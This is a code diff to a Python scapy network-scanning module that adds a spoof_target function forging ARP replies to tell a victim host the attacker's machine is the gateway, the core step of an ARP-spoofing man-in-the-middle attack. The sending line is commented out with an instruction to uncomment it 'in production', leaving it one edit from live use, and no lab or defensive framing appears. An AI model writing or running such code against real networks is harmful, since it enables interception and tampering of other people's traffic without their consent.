@@ -1,7 +1,7 @@
 import subprocess
 import re
 import ipaddress
-from scapy.all import ARP, Ether, srp
+from scapy.all import ARP, Ether, srp, send
 
 def get_gateway_info():
     """
@@ -58,3 +58,36 @@ def scan_network(ip_range):
         raise ValueError(f"Invalid IP range: {ip_range}") from e
     except Exception as e:
         raise RuntimeError(f"Error scanning network: {e}") from e
+
+def spoof_target(victim_ip, victim_mac, gateway_ip):
+    """
+    Sends an unsolicited ARP response to the target, telling it the attacker's computer is the router.
+
+    Args:
+        victim_ip (str): IP address of the victim to spoof.
+        victim_mac (str): MAC address of the victim.
+        gateway_ip (str): IP address of the gateway.
+    
+    Returns:
+        dict: Details about the ARP packet, including source MAC (hwsrc), target MAC (hwdst), target IP (pdst), and spoofed source IP (psrc).
+    """
+    try:
+        # Create the ARP packet
+        packet = ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=gateway_ip)
+        
+        # Print debug information for testing
+        print(packet.show())
+        print(packet.summary())
+        
+        # Uncomment the send line in production
+        # send(packet, verbose=False)
+
+        # Return details for the message
+        return {
+            "hwsrc": packet.hwsrc,  # Attacker's MAC address
+            "hwdst": packet.hwdst,  # Victim's MAC address
+            "pdst": packet.pdst,    # Victim's IP address
+            "psrc": packet.psrc     # Spoofed source IP (gateway IP)
+        }
+    except Exception as e:
+        raise RuntimeError(f"Error during ARP spoofing: {e}")
